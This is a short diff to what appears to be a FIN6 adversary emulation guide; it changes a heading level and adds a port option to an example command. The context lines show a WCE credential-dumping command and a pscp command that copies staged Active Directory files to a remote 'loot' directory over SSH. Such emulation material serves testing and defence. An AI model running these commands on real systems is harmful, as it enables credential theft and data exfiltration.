@@ -254,7 +254,7 @@ In addition to Mimikatz and psexec_ntdsgrab, FIN6 is reported to use WCE to acce
 wce.exe -w
 ```
 
-### Step 4 - FIN6 Collection and Exfiltration
+## Step 4 - FIN6 Collection and Exfiltration
 
 After conducting internal discovery, FIN6 has been reported to stage the resulting files, compress those files, and typically exfiltrate using SSH. <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
@@ -287,5 +287,5 @@ Example: C:\>plink -ssh root@192.168.101.1
 ##### Alternative Procedure
 
 ```sh
-pscp c:\windows\temp\ad_* root@192.168.101.1:/temp/loot
+pscp c:\windows\temp\ad_* -P {port} root@192.168.101.1:/temp/loot
 ```
